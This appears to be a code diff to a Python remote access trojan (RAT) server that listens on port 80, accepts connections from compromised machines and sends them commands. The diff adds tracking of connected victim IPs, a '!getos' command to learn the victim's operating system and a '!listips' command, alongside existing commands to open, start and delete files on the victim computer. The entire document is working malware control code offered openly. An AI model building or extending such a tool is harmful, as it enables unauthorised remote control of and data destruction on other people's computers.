@@ -1,26 +1,38 @@
 import socket, os, threading
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ip = socket.gethostbyname(socket.gethostname())
+ip = '0.0.0.0'
 port = 80
 s.bind((ip, port))
 connections = []
+ready = False
+conn_ips = []
 def connect():
     while True:
-        s.listen(1)
-        conn, ip = s.accept()
-        print(f"\n[+] {ip} has connected the the RAT Server.")
-        connections.append(conn)
+        global ready
+        if ready:
+            s.listen(1)
+            conn, ip = s.accept()
+            if ip[0] in conn_ips:
+                print(f"\n[+] Another Connection from {ip} has connected to the RAT Server.")
+            else:
+                print(f"\n[+] {ip} has connected the the RAT Server.")
+                conn_ips.append(ip[0])
+                connections.append(conn)
 def recv():
     while True:
         for connection in connections:
             try:
                 conn = connection
-                message = conn.recv(1024)
+                message = conn.recv(10240)
                 message = message.decode()
-                print(f"\n[+] Message from Conn {conn}: {message}")
+                if message.strip() == "":
+                    pass
+                else:
+                    print(f"\n[+] Message from Conn {conn}: {message}")
             except:
                 pass
 def instruct():
+    global ready
     print(" _____         _______    _____                            ___    ___  ")
     print("|  __ \     /\|__   __|  / ____|                          |__ \  / _ \ ")
     print("| |__) |   /  \  | |    | (___   ___ _ ____   _____ _ __     ) || | | |")
@@ -48,6 +60,9 @@ def instruct():
     print("[+] !openfile <filename> - Opens a File in Text editor mode(only 1 word filenames)")
     print("[+] !startfile <filename> - Starts a file(only one word filenames)")
     print("[+] !delfile <filename> - Deletes a file in the working directory(only 1 word filenames)")
+    print("[+] !getos - Gets the operating system of the victim computer")
+    print("[+] !listips - Lists all connected IPs to the server")
+    ready = True
     while True:
         try:
             instruction = input("\n[+] Enter an Instruction: ")
@@ -77,6 +92,8 @@ def instruct():
                                 conn.close()
                     except:
                         print("[+] There was an error.")
+            elif instruction.decode().lower().startswith('!listips'):
+                print(f"[+] List of IPs: {conn_ips}")
             for connection in connections:
                 try:
                     conn = connection
